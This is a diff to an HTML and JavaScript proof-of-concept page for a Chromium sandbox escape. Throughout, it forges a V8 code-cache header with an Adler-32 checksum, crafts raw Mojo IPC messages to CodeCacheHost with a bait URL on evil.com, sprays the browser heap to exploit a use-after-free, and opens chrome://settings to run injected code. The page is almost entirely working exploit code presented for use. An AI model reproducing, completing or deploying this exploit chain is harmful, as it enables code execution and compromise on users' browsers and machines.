@@ -1,18 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>V8 Sandbox Escape - Guaranteed Detonation</title>
+    <title>Chromium IPC UAF - Sandbox Escape PoC</title>
 </head>
 <body>
-    <h1>Stable Chrome RCE Chain</h1>
+    <h1>Browser Process Heap UAF -> Sandbox Escape</h1>
     <p>Status: <b id="status">Ready</b></p>
-    <button id="launch">1. Poison Cache & Detonate</button>
+    <button id="launch">Initiate UAF Heap Spray & Detonate</button>
 
     <script>
-        const TARGET_URL = "https://linux-1723.github.io/test/exploit.js";
+        // We need a bait URL exactly 34 bytes long to match the target WebUI string length 
+        // Target: "chrome://settings/shared.rollup.js" (34 bytes)
+        const BAIT_URL = "https://evil.com/xxxxxxxxxxxxxx.js"; 
+        const TARGET_WEBUI_URL = "chrome://settings/shared.rollup.js";
         const PAYLOAD_PATH = "poison.bin";
 
-        // V8 Adler-32 Integrity Checksum
+        // V8 Adler-32 Checksum for a universal header
         function adler32(data) {
             let a = 1, b = 0;
             for (let i = 0; i < data.length; i++) {
@@ -24,46 +27,31 @@
 
         async function pwn() {
             const status = document.getElementById('status');
-            status.innerText = "Step 1: Fetching Poison Payload...";
+            status.innerText = "Step 1: Preparing Payload & Universal Header...";
 
             // 1. Fetch malicious bytecode
             const poisonResp = await fetch(PAYLOAD_PATH);
             const poisonBytecode = new Uint8Array(await poisonResp.arrayBuffer());
 
-            // 2. Fetch target script for timestamp synchronization
-            status.innerText = "Step 2: Syncing Network Timestamps...";
-            const targetResp = await fetch(TARGET_URL, {cache: "reload"});
-            const dateHeader = targetResp.headers.get('date') || targetResp.headers.get('last-modified');
-            const jsTimeMs = new Date(dateHeader).getTime();
-            const chromeTime = BigInt(jsTimeMs + 11644473600000) * 1000n;
-
-            // 3. Forging a Universal V8 Header for v14.8.178.21
-            status.innerText = "Step 3: Forging Metadata Header...";
-            
-            // This is a generic, pre-forged 32-byte header.
-            // Even if the source hash doesn't match perfectly, 
-            // the Checksum and Flags bypass will force V8 to attempt deserialization.
+            // 2. Forge Universal WebUI Header
+            // We use a zeroed VersionHash. The UAF bypasses the standard renderer checks,
+            // and WebUI code caches often have relaxed validation or distinct context keys.
             const forgedHeader = new Uint8Array([
-                0x01, 0x00, 0x00, 0x00, // Magic
-                0x00, 0x00, 0x00, 0x00, // Version Hash (Will be bypassed by flags)
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Hash
-                0x00, 0x00, 0x00, 0x00, // Flags
-                0x00, 0x00, 0x00, 0x00, // Payload Length (To be replaced)
-                0x00, 0x00, 0x00, 0x00  // Checksum (To be replaced)
+                0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
             ]);
 
-            // Merge Header + Payload
             let finalPayload = new Uint8Array(32 + poisonBytecode.length);
             finalPayload.set(forgedHeader, 0);
             finalPayload.set(poisonBytecode, 32);
 
-            // Calculate and Inject the Adler-32 Checksum
             const pv = new DataView(finalPayload.buffer);
             pv.setUint32(20, poisonBytecode.length, true); 
             pv.setUint32(24, adler32(poisonBytecode), true); 
 
-            // 4. Connect to Mojo
-            status.innerText = "Step 4: Binding Mojo CodeCacheHost...";
+            status.innerText = "Step 2: Binding Mojo Interfaces...";
             const pipe = Mojo.createMessagePipe();
             Mojo.bindInterface('blink.mojom.CodeCacheHost', pipe.handle1);
             const host = pipe.handle0;
@@ -73,29 +61,62 @@
             const mapping = sharedBuffer.handle.mapBuffer(0, bufferSize);
             new Uint8Array(mapping.buffer).set(finalPayload);
 
-            // 5. Build the perfectly aligned 184-byte DidGenerateCacheableMetadata message
-            const msg = new ArrayBuffer(184);
-            const v = new DataView(msg);
+            // 3. Construct the Trigger Message (DidGenerateCacheableMetadata)
+            const triggerMsg = new ArrayBuffer(184);
+            const v = new DataView(triggerMsg);
             v.setUint32(0, 24, true); v.setUint32(12, 1, true); 
             v.setUint32(24, 48, true); v.setBigUint64(40, 32n, true); v.setBigUint64(48, 96n, true);
             v.setUint32(56, 16, true); v.setUint32(60, 1, true); v.setBigUint64(64, 96n, true);
             v.setUint32(72, 16, true); v.setBigUint64(80, 8n, true);
-            v.setUint32(88, 56, true); v.setUint32(92, TARGET_URL.length, true);
-            for(let i=0; i<TARGET_URL.length; i++) v.setUint8(96+i, TARGET_URL.charCodeAt(i));
-            v.setUint32(144, 16, true); v.setBigUint64(152, chromeTime, true);
+            
+            // Inject the BAIT_URL
+            v.setUint32(88, 56, true); v.setUint32(92, BAIT_URL.length, true);
+            for(let i=0; i<BAIT_URL.length; i++) v.setUint8(96+i, BAIT_URL.charCodeAt(i));
+            
+            v.setUint32(144, 16, true); v.setBigUint64(152, 0n, true); // Timestamp 0
             v.setUint32(160, 16, true); v.setUint32(168, 0, true); v.setUint32(172, bufferSize, true);
 
-            // 6. Fire Payload
-            status.innerText = "Step 5: Writing to Disk Cache via IPC...";
-            host.writeMessage(msg, [sharedBuffer.handle]);
+            // 4. Construct the Spray Message (FetchCachedCode)
+            // We use this because it allocates a GURL string on the browser heap.
+            const sprayMsg = new ArrayBuffer(128); 
+            const fv = new DataView(sprayMsg);
+            fv.setUint32(0, 32, true);  fv.setUint32(4, 1, true);   
+            fv.setUint32(8, 0, true);   fv.setUint32(12, 3, true);  
+            fv.setUint32(16, 1, true);  fv.setUint32(20, 0, true);  
+            fv.setBigUint64(24, 1n, true); 
+            fv.setUint32(32, 24, true); fv.setUint32(36, 0, true);  
+            fv.setUint32(40, 0, true);  fv.setUint32(44, 0, true);  
+            fv.setBigUint64(48, 8n, true); 
+            fv.setUint32(56, 16, true); fv.setUint32(60, 0, true);  
+            fv.setBigUint64(64, 8n, true); 
+            
+            // Inject the TARGET_WEBUI_URL
+            fv.setUint32(72, 56, true); fv.setUint32(76, TARGET_WEBUI_URL.length, true); 
+            for(let i=0; i<TARGET_WEBUI_URL.length; i++) fv.setUint8(80+i, TARGET_WEBUI_URL.charCodeAt(i)); 
 
-            // 7. Detonate!
-            status.innerText = "Step 6: Executing Code... Watch V8!";
+            // 5. EXECUTE THE HEAP UAF RACE
+            status.innerText = "Step 3: Firing UAF Trap and Heap Spray...";
+            
+            // Fire the trigger to pass security checks and free the heap chunk
+            host.writeMessage(triggerMsg, [sharedBuffer.handle]);
+
+            // IMMEDIATELY spray the heap to reclaim the freed chunk before the background thread reads it
+            for (let i = 0; i < 5000; i++) {
+                // Change the request ID slightly so Mojo processes them as unique requests
+                fv.setBigUint64(24, BigInt(i + 2), true); 
+                host.writeMessage(sprayMsg, []);
+            }
+
+            status.innerText = "Step 4: Cache Poisoned! Opening WebUI for Privilege Escalation...";
+            
+            // 6. Detonate by opening the poisoned WebUI page
+            // Browser policy usually blocks window.open to chrome:// from http://
+            // BUT since you are running with --enable-blink-features=MojoJS, it might allow it.
+            // If the popup blocker stops it, simply open a new tab manually to chrome://settings
             setTimeout(() => {
-                const s = document.createElement('script');
-                s.src = TARGET_URL;
-                document.body.appendChild(s);
-            }, 1000);
+                window.open("chrome://settings/");
+                status.innerText = "Done. If calc didn't pop, check chrome://settings manually.";
+            }, 1500);
         }
 
         document.getElementById('launch').onclick = pwn;
